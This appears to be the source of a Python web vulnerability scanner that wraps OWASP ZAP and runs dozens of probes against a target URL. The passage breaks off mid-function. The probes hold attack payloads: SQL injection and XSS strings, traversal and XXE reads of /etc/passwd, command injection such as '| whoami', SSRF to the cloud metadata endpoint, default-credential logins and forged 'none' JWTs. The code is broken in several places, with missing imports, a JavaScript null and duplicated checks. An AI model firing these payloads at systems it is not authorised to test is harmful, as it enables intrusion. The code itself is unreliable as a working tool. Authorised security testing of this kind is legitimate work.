import asyncio
import aiohttp
import argparse
import logging
import time
from typing import Dict, Any, List, Optional
from urllib.parse import urljoin, urlparse
import yaml
import json
from pathlib import Path
from zapv2 import ZAPv2
from aiohttp import TCPConnector
from aiolimiter import AsyncLimiter
import ssl
import certifi
import aiodns
import aiofiles
from tqdm import tqdm
import pickle
from dataclasses import dataclass
from enum import Enum


# Setup logging
logging.basicConfig(
    filename='vuln_scan.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def load_config(config_file: str) -> Dict[str, Any]:
    with open(config_file, 'r') as f:
        config = yaml.safe_load(f)
    validate_config(config)
    return config

def validate_config(config: Dict[str, Any]):
    required_keys = ['zap_url', 'user_agent', 'rate_limit_max', 'rate_limit_time']
    for key in required_keys:
        if key not in config:
            raise ValueError(f"Missing required configuration key: {key}")

async def resolve_subdomain(subdomain: str, resolver: aiodns.DNSResolver) -> bool:
    try:
        await resolver.query(subdomain, 'A')
        return True
    except aiodns.error.DNSError:
        return False

async def discover_subdomains(domain: str) -> List[str]:
    common_subdomains = ['www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk', 
                         'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test', 
                         'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3', 
                         'mail2', 'new', 'mysql', 'old', 'lists', 'support', 'mobile', 'mx', 'static', 
                         'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 'cp', 'calendar', 'wiki', 
                         'web', 'media', 'email', 'images', 'img', 'www1', 'intranet', 'portal', 'video', 
                         'sip', 'dns2', 'api', 'cdn', 'stats', 'dns1', 'ns4', 'www3', 'dns', 'search', 
                         'staging', 'server', 'mx1', 'chat', 'wap', 'my', 'svn', 'mail1', 'sites', 'proxy', 
                         'ads', 'host', 'crm', 'cms', 'backup', 'mx2', 'lyncdiscover', 'info', 'apps', 'download']

    subdomains = []
    resolver = aiodns.DNSResolver()
    tasks = [resolve_subdomain(f"{sub}.{domain}", resolver) for sub in common_subdomains]
    results = await asyncio.gather(*tasks)
    
    for subdomain, exists in zip(common_subdomains, results):
        if exists:
            full_subdomain = f"{subdomain}.{domain}"
            subdomains.append(full_subdomain)
            logger.info(f"Discovered subdomain: {full_subdomain}")

    return subdomains

class VulnerabilityScanner:
    def __init__(self, target: str, timeout: int, zap_instance: Any, config: Dict[str, Any]):
        self.target = target
        self.timeout = timeout
        self.zap = zap_instance
        self.config = config
        self.results: List[Dict[str, Any]] = []
        self.rate_limiter = AsyncLimiter(config['rate_limit_max'], config['rate_limit_time'])

    async def start_zap_scan(self):
        logger.info(f"Starting ZAP scan on {self.target}")
        try:
            self.zap.urlopen(self.target)
            scan_id = self.zap.ascan.scan(self.target)
            start_time = time.time()
            with tqdm(total=100, desc=f"Scanning {self.target}", unit="%") as pbar:
                while int(self.zap.ascan.status(scan_id)) < 100:
                    if time.time() - start_time > self.timeout:
                        logger.warning(f"ZAP scan timed out after {self.timeout} seconds")
                        break
                    progress = int(self.zap.ascan.status(scan_id))
                    pbar.update(progress - pbar.n)
                    await asyncio.sleep(5)
                pbar.update(100 - pbar.n)
            logger.info("ZAP scan completed")
        
            alerts = self.zap.core.alerts(baseurl=self.target)
            for alert in alerts:
                self.results.append({
                    "type": "ZAP",
                    "alert": alert['alert'],
                    "risk": alert['risk'],
                    "url": alert['url']
                })
                logger.info(f"Alert: {alert['alert']}, Risk: {alert['risk']}, URL: {alert['url']}")
        except Exception as e:
            logger.error(f"Error during ZAP scan: {e}", exc_info=True)
        
    async def run_scans(self):
        headers = {
            'User-Agent': self.config['user_agent']
        }
        conn = TCPConnector(ssl=False)
        async with aiohttp.ClientSession(headers=headers, connector=conn) as session:
            tasks = [
                self.check_vulnerability(session, self.check_sql_injection, "SQL Injection"),
                self.check_vulnerability(session, self.check_xss, "XSS"),
                self.check_vulnerability(session, self.check_csrf, "CSRF"),
                self.check_vulnerability(session, self.check_ssl, "SSL/TLS Misconfiguration"),
                self.check_vulnerability(session, self.check_directory_traversal, "Directory Traversal"),
                self.check_vulnerability(session, self.check_remote_code_execution, "Remote Code Execution"),
                self.check_vulnerability(session, self.check_ssrf, "Server-Side Request Forgery"),
                self.check_vulnerability(session, self.check_xxe, "XML External Entity Injection"),
                self.check_vulnerability(session, self.check_open_redirect, "Open Redirect"),
                self.check_vulnerability(session, self.check_idor, "Insecure Direct Object References"),
                self.check_vulnerability(session, self.check_host_header_injection, "Host Header Injection"),
                self.check_vulnerability(session, self.check_clickjacking, "Clickjacking"),
                self.check_vulnerability(session, self.check_cors_misconfiguration, "CORS Misconfiguration"),
                self.check_vulnerability(session, self.check_jwt_vulnerabilities, "JWT Vulnerabilities"),
                self.check_vulnerability(session, self.check_insecure_deserialization, "Insecure Deserialization"),
                self.check_vulnerability(session, self.check_server_side_template_injection, "Server-Side Template Injection"),
                self.check_vulnerability(session, self.check_command_injection, "Command Injection"),
                self.check_vulnerability(session, self.check_file_inclusion, "File Inclusion"),
                self.check_vulnerability(session, self.check_http_response_splitting, "HTTP Response Splitting"),
                self.check_vulnerability(session, self.check_ldap_injection, "LDAP Injection"),
                self.check_vulnerability(session, self.check_nosql_injection, "NoSQL Injection"),
                self.check_vulnerability(session, self.check_path_traversal, "Path Traversal"),
                self.check_vulnerability(session, self.check_security_headers, "Missing Security Headers"),
                self.check_vulnerability(session, self.check_sensitive_data_exposure, "Sensitive Data Exposure"),
                self.check_vulnerability(session, self.check_unvalidated_redirects, "Unvalidated Redirects"),
                self.check_vulnerability(session, self.check_xml_injection, "XML Injection"),
                self.check_vulnerability(session, self.check_csp_misconfiguration, "CSP Misconfiguration"),
                self.check_vulnerability(session, self.check_cookie_security, "Insecure Cookie Configuration"),
                self.check_vulnerability(session, self.check_cors_misconfiguration, "CORS Misconfiguration"),
                self.check_vulnerability(session, self.check_http_methods, "Dangerous HTTP Methods"),
                self.check_vulnerability(session, self.check_information_disclosure, "Information Disclosure"),
                self.check_vulnerability(session, self.check_graphql_introspection, "GraphQL Introspection"),
                self.check_vulnerability(session, self.check_http_parameter_pollution, "HTTP Parameter Pollution"),
                self.check_vulnerability(session, self.check_insecure_file_upload, "Insecure File Upload"),
                self.check_vulnerability(session, self.check_oauth_misconfiguration, "OAuth Misconfiguration"),
                self.check_vulnerability(session, self.check_race_condition, "Race Condition"),
                self.check_vulnerability(session, self.check_subdomain_takeover, "Subdomain Takeover"),
                self.check_vulnerability(session, self.check_web_cache_poisoning, "Web Cache Poisoning"),
                self.check_vulnerability(session, self.check_websocket_security, "WebSocket Security"),
                self.check_vulnerability(session, self.check_api_rate_limiting, "API Rate Limiting"),
                self.check_vulnerability(session, self.check_business_logic_flaws, "Business Logic Flaws"),
                self.check_vulnerability(session, self.check_credential_stuffing, "Credential Stuffing"),
                self.check_vulnerability(session, self.check_cryptographic_failures, "Cryptographic Failures"),
                self.check_vulnerability(session, self.check_improper_asset_management, "Improper Asset Management"),
                self.check_vulnerability(session, self.check_mass_assignment, "Mass Assignment"),
                self.check_vulnerability(session, self.check_server_side_request_forgery, "Server-Side Request Forgery"),
                self.check_vulnerability(session, self.check_prototype_pollution, "Prototype Pollution"),
                self.check_vulnerability(session, self.check_dom_clobbering, "DOM Clobbering"),
                self.check_vulnerability(session, self.check_web_socket_hijacking, "Web Socket Hijacking"),
                self.check_vulnerability(session, self.check_http2_misconfiguration, "HTTP/2 Misconfiguration"),
                self.check_vulnerability(session, self.check_subdomain_enumeration, "Subdomain Enumeration"),
                self.check_vulnerability(session, self.check_jwt_none_algorithm, "JWT None Algorithm"),
                self.check_vulnerability(session, self.check_css_injection, "CSS Injection"),
                self.check_vulnerability(session, self.check_html5_cross_origin, "HTML5 Cross Origin Issues"),
                self.check_vulnerability(session, self.check_cloudflare_bypass, "Cloudflare Bypass"),
                self.check_vulnerability(session, self.check_host_header_cache_poisoning, "Host Header Cache Poisoning"),
                self.check_vulnerability(session, self.check_crlf_injection, "CRLF Injection"),
                self.check_vulnerability(session, self.check_web_cache_deception, "Web Cache Deception"),
                self.check_vulnerability(session, self.check_tabnabbing, "Tabnabbing"),
                self.check_vulnerability(session, self.check_reverse_tabnabbing, "Reverse Tabnabbing"),
                self.check_vulnerability(session, self.check_postmessage_vulnerabilities, "postMessage Vulnerabilities"),
                self.check_vulnerability(session, self.check_waf_presence, "WAF Detection"),
                self.check_vulnerability(session, self.check_http_smuggling_enhanced, "Enhanced HTTP Smuggling"),
                self.check_vulnerability(session, self.check_dependency_confusion, "Dependency Confusion"),
                self.check_vulnerability(session, self.check_ssti_enhanced, "Enhanced SSTI"),
                self.check_vulnerability(session, self.check_insecure_deserialization_enhanced, "Enhanced Insecure Deserialization"),
                self.check_vulnerability(session, self.check_graphql_vulnerabilities, "GraphQL Vulnerabilities"),
                self.check_vulnerability(session, self.check_api_vulnerabilities, "API Vulnerabilities"),
                self.check_vulnerability(session, self.check_ssrf_enhanced, "Enhanced SSRF"),
                self.check_vulnerability(session, self.check_log4j_vulnerability, "Log4j Vulnerability"),
                self.check_vulnerability(session, self.check_improper_input_validation, "Improper Input Validation"),
            ]
            await asyncio.gather(*tasks)

    async def check_vulnerability(self, session: aiohttp.ClientSession, check_func, name: str):
        try:
            async with self.rate_limiter:
                result = await check_func(session, self.target)
            if result:
                self.results.append({"type": name, "status": "Detected", "url": self.target})
                logger.warning(f"{name} vulnerability detected!")
            else:
                self.results.append({"type": name, "status": "Not Detected", "url": self.target})
                logger.info(f"No {name} vulnerability detected.")
        except Exception as e:
            logger.error(f"Error during {name} check: {e}", exc_info=True)

    async def check_sql_injection(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = ["' OR '1'='1", "1 OR 1=1", "' UNION SELECT NULL,NULL,NULL--"]
        for payload in payloads:
            async with session.get(urljoin(url, "search"), params={"q": payload}, timeout=10) as response:
                text = await response.text()
                if "SQL syntax" in text or "mysql_fetch" in text:
                    return True
        return False

    async def check_xss(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "javascript:alert('XSS')"]
        for payload in payloads:
            async with session.get(urljoin(url, "search"), params={"q": payload}, timeout=10) as response:
                text = await response.text()
                if payload in text:
                    return True
        return False

    async def check_csrf(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(url, timeout=10) as response:
            headers = response.headers
            return 'X-CSRF-Token' not in headers and 'X-XSRF-TOKEN' not in headers

    async def check_ssl(self, session: aiohttp.ClientSession, url: str) -> bool:
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        try:
            ssl_context = ssl.create_default_context(cafile=certifi.where())
            async with session.get(f"https://{hostname}", ssl=ssl_context) as response:
                return response.headers.get('Strict-Transport-Security') is None
        except ssl.SSLError:
            return True

    async def check_directory_traversal(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = ["../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd", "....//....//....//etc/passwd"]
        for payload in payloads:
            async with session.get(urljoin(url, payload), timeout=10) as response:
                text = await response.text()
                if "root:x:0:0" in text:
                    return True
        return False

    async def check_remote_code_execution(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = [";ls", "& ping -c 1 127.0.0.1", "|echo vulnerable"]
        for payload in payloads:
            async with session.get(urljoin(url, f"search?q={quote(payload)}"), timeout=10) as response:
                text = await response.text()
                if any(indicator in text for indicator in ["bin", "64 bytes from 127.0.0.1", "vulnerable"]):
                    return True
        return False

    async def check_ssrf(self, session: aiohttp.ClientSession, url: str) -> bool:
        ssrf_url = "http://169.254.169.254/latest/meta-data/"  # AWS metadata endpoint
        async with session.get(urljoin(url, f"proxy?url={quote(ssrf_url)}"), timeout=10) as response:
            text = await response.text()
            return "ami-id" in text or "instance-id" in text

    async def check_xxe(self, session: aiohttp.ClientSession, url: str) -> bool:
        xxe_payload = """
        <?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>
        """
        headers = {'Content-Type': 'application/xml'}
        async with session.post(urljoin(url, "process_xml"), data=xxe_payload, headers=headers, timeout=10) as response:
            text = await response.text()
            return "root:x:0:0" in text

    async def check_open_redirect(self, session: aiohttp.ClientSession, url: str) -> bool:
        malicious_url = "https://evil.com"
        async with session.get(urljoin(url, f"redirect?url={quote(malicious_url)}"), allow_redirects=False, timeout=10) as response:
            return response.status == 302 and response.headers.get('Location') == malicious_url

    async def check_idor(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(urljoin(url, "user/profile/1"), timeout=10) as response:
            text = await response.text()
            return "admin" in text.lower() or "root" in text.lower()

    async def check_host_header_injection(self, session: aiohttp.ClientSession, url: str) -> bool:
        headers = {'Host': 'malicious.com'}
        async with session.get(url, headers=headers, timeout=10) as response:
            text = await response.text()
            return "malicious.com" in text

    async def check_clickjacking(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(url, timeout=10) as response:
            headers = response.headers
            return 'X-Frame-Options' not in headers and 'Content-Security-Policy' not in headers

    async def check_cors_misconfiguration(self, session: aiohttp.ClientSession, url: str) -> bool:
        headers = {'Origin': 'https://malicious.com'}
        async with session.get(url, headers=headers, timeout=10) as response:
            cors_header = response.headers.get('Access-Control-Allow-Origin')
            return cors_header == '*' or cors_header == 'https://malicious.com'

    async def check_jwt_vulnerabilities(self, session: aiohttp.ClientSession, url: str) -> bool:
        weak_secret = "secret"
        payload = {
            "sub": "1234567890",
            "name": "John Doe",
            "iat": 1516239022
        }
        token = jwt.encode(payload, weak_secret, algorithm="HS256")
        
        headers = {"Authorization": f"Bearer {token}"}
        async with session.get(urljoin(url, "api/protected"), headers=headers, timeout=10) as response:
            return response.status == 200

    async def check_insecure_deserialization(self, session: aiohttp.ClientSession, url: str) -> bool:
        payload = "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}"
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        async with session.post(urljoin(url, "deserialize"), data={"data": payload}, headers=headers, timeout=10) as response:
            text = await response.text()
            return "PHP Fatal error:" in text or "Java.lang.Exception" in text

    async def check_server_side_template_injection(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
        for payload in payloads:
            async with session.get(urljoin(url, f"template?name={quote(payload)}"), timeout=10) as response:
                text = await response.text()
                if "49" in text:
                    return True
        return False

    async def check_command_injection(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = ["; ls", "& dir", "| whoami", "$(echo vulnerable)"]
        for payload in payloads:
            async with session.get(urljoin(url, f"search?q={quote(payload)}"), timeout=10) as response:
                text = await response.text()
                if any(indicator in text.lower() for indicator in ["bin", "users", "home", "vulnerable"]):
                    return True
        return False

    async def check_file_inclusion(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = ["/etc/passwd", "C:\\Windows\\System32\\drivers\\etc\\hosts", "/proc/self/environ"]
        for payload in payloads:
            async with session.get(urljoin(url, f"page={quote(payload)}"), timeout=10) as response:
                text = await response.text()
                if "root:" in text or "127.0.0.1" in text or "DOCUMENT_ROOT" in text:
                    return True
        return False

    async def check_http_response_splitting(self, session: aiohttp.ClientSession, url: str) -> bool:
        payload = "%0D%0ASet-Cookie: sessionid=malicious%0D%0AContent-Length: 0%0D%0A%0D%0AHTTP/1.1 200 OK%0D%0AContent-Type: text/html%0D%0AContent-Length: 35%0D%0A%0D%0A<html>Malicious content</html>"
        async with session.get(urljoin(url, f"redirect?url={payload}"), allow_redirects=False, timeout=10) as response:
            return "Set-Cookie: sessionid=malicious" in response.headers.get('Set-Cookie', '')

    async def check_ldap_injection(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = ["*)(uid=*))(|(uid=*", "*()|&'", "*)(uid=*))(|(uid=*"]
        for payload in payloads:
            async with session.post(urljoin(url, "login"), data={"username": payload, "password": "password"}, timeout=10) as response:
                text = await response.text()
                if "LDAP" in text or "directory" in text.lower():
                    return True
        return False

    async def check_nosql_injection(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = [
            {"$gt": ""},
            {"$ne": null},
            {"$where": "1==1"}
        ]
        for payload in payloads:
            async with session.post(urljoin(url, "api/users"), json={"username": payload}, timeout=10) as response:
                if response.status == 200:
                    return True
        return False

    async def check_path_traversal(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = ["../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd", "..\\..\\..\\windows\\win.ini"]
        for payload in payloads:
            async with session.get(urljoin(url, f"download?file={quote(payload)}"), timeout=10) as response:
                text = await response.text()
                if "root:" in text or "[extensions]" in text:
                    return True
        return False

    async def check_security_headers(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(url, timeout=10) as response:
            headers = response.headers
            missing_headers = []
            security_headers = [
                'Strict-Transport-Security',
                'X-Frame-Options',
                'X-Content-Type-Options',
                'Content-Security-Policy',
                'X-XSS-Protection',
                'Referrer-Policy'
            ]
            for header in security_headers:
                if header not in headers:
                    missing_headers.append(header)
            if missing_headers:
                self.results.append({"type": "Missing Security Headers", "missing": missing_headers, "url": url})
                return True
        return False

    async def check_sensitive_data_exposure(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(url, timeout=10) as response:
            text = await response.text()
            patterns = [
                r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
                r'\b(?:\d{1,3}\.){3}\d{1,3}\b',  # IP Address
                r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
                r'\b(?:\d{4}[-\s]?){3}\d{4}\b'  # Credit Card
            ]
            for pattern in patterns:
                if re.search(pattern, text):
                    return True
        return False

    async def check_unvalidated_redirects(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = ["https://example.com", "//evil.com", "/\\/example.com"]
        for payload in payloads:
            async with session.get(urljoin(url, f"redirect?url={quote(payload)}"), allow_redirects=False, timeout=10) as response:
                if response.status == 302 and payload in response.headers.get('Location', ''):
                    return True
        return False

    async def check_xml_injection(self, session: aiohttp.ClientSession, url: str) -> bool:
        payload = '<?xml version="1.0"?><methodCall><methodName>test</methodName><params><param><value><name>',
        headers = {'Content-Type': 'application/xml'}
        async with session.post(urljoin(url, "api"), data=payload, headers=headers, timeout=10) as response:
            text = await response.text()
            return "XML" in text and "error" in text.lower()

    async def check_csp_misconfiguration(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(url, timeout=10) as response:
            csp = response.headers.get('Content-Security-Policy')
            if not csp:
                return True
            if "unsafe-inline" in csp or "unsafe-eval" in csp:
                return True
        return False

    async def check_cookie_security(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(url, timeout=10) as response:
            cookies = response.cookies
            for cookie in cookies.values():
                if not cookie.get('secure') or not cookie.get('httponly'):
                    return True
        return False

    async def check_cors_misconfiguration(self, session: aiohttp.ClientSession, url: str) -> bool:
        headers = {'Origin': 'https://malicious.com'}
        async with session.get(url, headers=headers, timeout=10) as response:
            acao_header = response.headers.get('Access-Control-Allow-Origin')
            if acao_header == '*' or acao_header == 'https://malicious.com':
                return True
        return False

    async def check_http_methods(self, session: aiohttp.ClientSession, url: str) -> bool:
        dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'OPTIONS']
        for method in dangerous_methods:
            try:
                async with session.request(method, url, timeout=10) as response:
                    if response.status < 400:
                        self.results.append({"type": "Dangerous HTTP Method", "method": method, "url": url})
                        return True
            except:
                pass
        return False

    async def check_information_disclosure(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(url, timeout=10) as response:
            headers = response.headers
            server = headers.get('Server')
            x_powered_by = headers.get('X-Powered-By')
            if server or x_powered_by:
                self.results.append({"type": "Information Disclosure", "headers": {"Server": server, "X-Powered-By": x_powered_by}, "url": url})
                return True
        return False

    async def check_graphql_introspection(self, session: aiohttp.ClientSession, url: str) -> bool:
        query = '''{
          __schema {
            types {
              name
            }
          }
        }'''
        async with session.post(urljoin(url, '/graphql'), json={'query': query}, timeout=10) as response:
            if response.status == 200:
                data = await response.json()
                return '__schema' in data.get('data', {})
        return False

    async def check_http_parameter_pollution(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(urljoin(url, 'search?q=test&q=polluted'), timeout=10) as response:
            text = await response.text()
            return 'polluted' in text
        return False

    async def check_insecure_file_upload(self, session: aiohttp.ClientSession, url: str) -> bool:
        files = {
            'file': ('test.php', '<?php echo "Test"; ?>', 'application/x-php')
        }
        async with session.post(urljoin(url, 'upload'), data=files, timeout=10) as response:
            text = await response.text()
            return 'upload successful' in text.lower() and '.php' in text
        return False

    async def check_oauth_misconfiguration(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(urljoin(url, '.well-known/oauth-authorization-server'), timeout=10) as response:
            if response.status == 200:
                data = await response.json()
                return 'authorization_endpoint' in data and 'token_endpoint' in data
        return False

    async def check_race_condition(self, session: aiohttp.ClientSession, url: str) -> bool:
        async def make_request():
            async with session.post(urljoin(url, 'api/resource'), json={'action': 'create'}, timeout=10) as response:
                return await response.json()

        results = await asyncio.gather(*[make_request() for _ in range(10)])
        return len(set(str(result) for result in results)) < 10

    async def check_subdomain_takeover(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(url, timeout=10) as response:
            text = await response.text()
            return any(indicator in text.lower() for indicator in [
                'there is no app configured at that hostname',
                'herokucdn.com/error-pages/no-such-app.html',
                'The specified bucket does not exist'
            ])

    async def check_web_cache_poisoning(self, session: aiohttp.ClientSession, url: str) -> bool:
        headers = {'X-Forwarded-Host': 'malicious.com'}
        async with session.get(url, headers=headers, timeout=10) as response:
            text = await response.text()
            return 'malicious.com' in text

    async def check_websocket_security(self, session: aiohttp.ClientSession, url: str) -> bool:
        ws_url = url.replace('http', 'ws')
        try:
            async with session.ws_connect(ws_url, timeout=10) as ws:
                await ws.send_str("{'action': 'subscribe', 'channel': 'all'}")
                msg = await ws.receive_str()
                return 'subscribed' in msg.lower()
        except:
            return False

    async def check_api_rate_limiting(self, session: aiohttp.ClientSession, url: str) -> bool:
        async def make_request():
            async with session.get(urljoin(url, 'api/resource'), timeout=10) as response:
                return response.status

        results = await asyncio.gather(*[make_request() for _ in range(50)])
        return all(status == 200 for status in results)

    async def check_business_logic_flaws(self, session: aiohttp.ClientSession, url: str) -> bool:
        # This is a simplified check. Real-world checks would be more specific to the application.
        async with session.post(urljoin(url, 'api/order'), json={'quantity': -1, 'price': 100}, timeout=10) as response:
            if response.status == 200:
                data = await response.json()
                return data.get('total', 0) < 0
        return False

    async def check_credential_stuffing(self, session: aiohttp.ClientSession, url: str) -> bool:
        common_credentials = [
            {'username': 'admin', 'password': 'admin'},
            {'username': 'user', 'password': 'password'},
            {'username': 'test', 'password': 'test123'}
        ]
        for cred in common_credentials:
            async with session.post(urljoin(url, 'login'), data=cred, timeout=10) as response:
                if response.status == 200:
                    return True
        return False

    async def check_cryptographic_failures(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(url, timeout=10) as response:
            if response.headers.get('Server', '').startswith('Apache/2.4'):
                return True
        return False

    async def check_improper_asset_management(self, session: aiohttp.ClientSession, url: str) -> bool:
        paths = ['/backup', '/old', '/dev', '/test', '/staging']
        for path in paths:
            async with session.get(urljoin(url, path), timeout=10) as response:
                if response.status == 200:
                    return True
        return False

    async def check_mass_assignment(self, session: aiohttp.ClientSession, url: str) -> bool:
        data = {
            'username': 'newuser',
            'email': 'newuser@example.com',
            'is_admin': True
        }
        async with session.post(urljoin(url, 'api/users'), json=data, timeout=10) as response:
            if response.status == 200:
                result = await response.json()
                return result.get('is_admin') == True
        return False

    async def check_server_side_request_forgery(self, session: aiohttp.ClientSession, url: str) -> bool:
        ssrf_url = 'http://169.254.169.254/latest/meta-data/'  # AWS metadata URL
        async with session.get(urljoin(url, f'fetch?url={quote(ssrf_url)}'), timeout=10) as response:
            text = await response.text()
            return 'ami-id' in text or 'instance-id' in text
        return False

    async def check_prototype_pollution(self, session: aiohttp.ClientSession, url: str) -> bool:
        payload = json.dumps({"__proto__": {"polluted": True}})
        async with session.post(urljoin(url, 'api/data'), data=payload, headers={'Content-Type': 'application/json'}, timeout=10) as response:
            if response.status == 200:
                data = await response.json()
                return data.get('polluted') == True
        return False

    async def check_dom_clobbering(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(url, timeout=10) as response:
            text = await response.text()
            return 'id="prototype"' in text or 'name="prototype"' in text

    async def check_web_socket_hijacking(self, session: aiohttp.ClientSession, url: str) -> bool:
        ws_url = url.replace('http', 'ws')
        try:
            async with session.ws_connect(ws_url, timeout=10) as ws:
                await ws.send_str("CONNECT malicious.com:80 HTTP/1.1")
                msg = await ws.receive_str()
                return 'HTTP/1.1 200 Connection established' in msg
        except:
            return False

    async def check_http2_misconfiguration(self, session: aiohttp.ClientSession, url: str) -> bool:
        try:
            async with session.get(url, timeout=10) as response:
                return 'HTTP/2' in response.headers.get('Server', '')
        except:
            return False

    async def check_subdomain_enumeration(self, session: aiohttp.ClientSession, url: str) -> bool:
        domain = url.split('//')[1].split('/')[0]
        subdomains = ['www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk', 'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig']
        valid_subdomains = []
        for subdomain in subdomains:
            try:
                full_url = f"http://{subdomain}.{domain}"
                async with session.get(full_url, timeout=5) as response:
                    if response.status == 200:
                        valid_subdomains.append(full_url)
            except:
                pass
        if valid_subdomains:
            self.results.append({"type": "Subdomain Enumeration", "subdomains": valid_subdomains})
            return True
        return False

    async def check_jwt_none_algorithm(self, session: aiohttp.ClientSession, url: str) -> bool:
        header = base64.b64encode(json.dumps({"alg":"none"}).encode()).decode()
        payload = base64.b64encode(json.dumps({"user":"admin"}).encode()).decode()
        token = f"{header}.{payload}."
        headers = {'Authorization': f'Bearer {token}'}
        async with session.get(urljoin(url, 'api/admin'), headers=headers, timeout=10) as response:
            return response.status == 200

    async def check_css_injection(self, session: aiohttp.ClientSession, url: str) -> bool:
        payload = '<style>@import url("javascript:alert(1)");</style>'
        async with session.post(urljoin(url, 'comment'), data={'content': payload}, timeout=10) as response:
            text = await response.text()
            return payload in text

    async def check_html5_cross_origin(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(url, timeout=10) as response:
            text = await response.text()
            return 'crossorigin' in text and not re.search(r'crossorigin\s*=\s*["\']use-credentials["\']', text)

    async def check_cloudflare_bypass(self, session: aiohttp.ClientSession, url: str) -> bool:
        headers = {'CF-Connecting-IP': '127.0.0.1', 'X-Forwarded-For': '127.0.0.1'}
        async with session.get(url, headers=headers, timeout=10) as response:
            return response.status == 200

    async def check_host_header_cache_poisoning(self, session: aiohttp.ClientSession, url: str) -> bool:
        headers = {'Host': 'malicious.com'}
        async with session.get(url, headers=headers, timeout=10) as response:
            text = await response.text()
            return 'malicious.com' in text

    async def check_crlf_injection(self, session: aiohttp.ClientSession, url: str) -> bool:
        payload = '%0D%0ASet-Cookie: malicious=1'
        async with session.get(urljoin(url, payload), allow_redirects=False, timeout=10) as response:
            return 'Set-Cookie: malicious=1' in response.headers.get('Set-Cookie', '')

    async def check_web_cache_deception(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(urljoin(url, 'profile/nonexistent.css'), timeout=10) as response:
            return 'username' in await response.text() or 'email' in await response.text()

    async def check_tabnabbing(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(url, timeout=10) as response:
            text = await response.text()
            return '<a href' in text and 'target="_blank"' in text and 'rel="noopener noreferrer"' not in text

    async def check_reverse_tabnabbing(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(url, timeout=10) as response:
            text = await response.text()
            return 'window.opener' in text

    async def check_postmessage_vulnerabilities(self, session: aiohttp.ClientSession, url: str) -> bool:
        async with session.get(url, timeout=10) as response:
            text = await response.text()
            return 'addEventListener("message"' in text and 'origin' not in text

    async def check_waf_presence(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = [
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "../../../etc/passwd"
        ]
        for payload in payloads:
            async with session.get(urljoin(url, f"search?q={quote(payload)}"), timeout=10) as response:
                if response.status == 403 or 'forbidden' in await response.text().lower():
                    return True
        return False

    async def check_http_smuggling_enhanced(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = [
            (b"GET / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ", "CL.TE"),
            (b"GET / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX", "TE.CL")
        ]
        for payload, variant in payloads:
            try:
                async with session.post(url, data=payload, timeout=10) as response:
                    if response.status in [400, 500] and 'Bad Request' not in await response.text():
                        self.results.append({"type": "HTTP Smuggling", "variant": variant, "url": url})
                        return True
            except:
                pass
        return False

    async def check_dependency_confusion(self, session: aiohttp.ClientSession, url: str) -> bool:
        package_files = ['package.json', 'requirements.txt', 'Gemfile']
        for file in package_files:
            async with session.get(urljoin(url, file), timeout=10) as response:
                if response.status == 200:
                    content = await response.text()
                    if '@company-scope' in content or 'company-package' in content:
                        return True
        return False

    async def check_ssti_enhanced(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
